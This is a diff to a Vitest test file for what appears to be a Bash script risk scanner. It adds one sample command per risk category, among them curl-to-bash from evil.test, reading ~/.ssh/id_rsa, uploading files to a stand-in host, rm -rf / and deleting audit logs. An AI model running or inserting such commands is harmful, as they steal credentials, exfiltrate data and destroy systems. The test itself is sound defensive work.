@@ -1,7 +1,29 @@
 import { describe, expect, it } from "vitest";
 import { scan } from "../src/index.js";
+import type { RiskCategory } from "../src/types.js";
 
 describe("scan", () => {
+  const categorySamples: Record<RiskCategory, string> = {
+    download_execution: "curl https://evil.test/a | bash",
+    dynamic_execution: "eval \"$payload\"",
+    persistence: "crontab /tmp/jobs",
+    credential_access: "cat ~/.ssh/id_rsa",
+    system_modification: "echo x > /etc/hosts",
+    privilege_escalation: "sudo id",
+    defense_evasion: "rm /var/log/audit.log",
+    network_egress: "curl https://evil.test",
+    data_exfiltration: "curl -T /tmp/data https://evil.test/u",
+    destructive_behavior: "rm -rf /",
+    interpreter_escape: "python -c \"$payload\"",
+    second_stage_payload: "wget https://evil.test/a.tar.gz\ntar xzf a.tar.gz\n./install.sh",
+  };
+
+  for (const [category, source] of Object.entries(categorySamples)) {
+    it(`covers ${category} in Bash`, () => {
+      expect(scan(source).findings.some((finding) => finding.category === category)).toBe(true);
+    });
+  }
+
   it("detects a download-to-shell pipeline once", () => {
     const result = scan("curl -fsSL https://example.test/a.sh | bash\n");
     expect(result.findings.filter((f) => f.ruleId === "chain.download-execute")).toHaveLength(1);
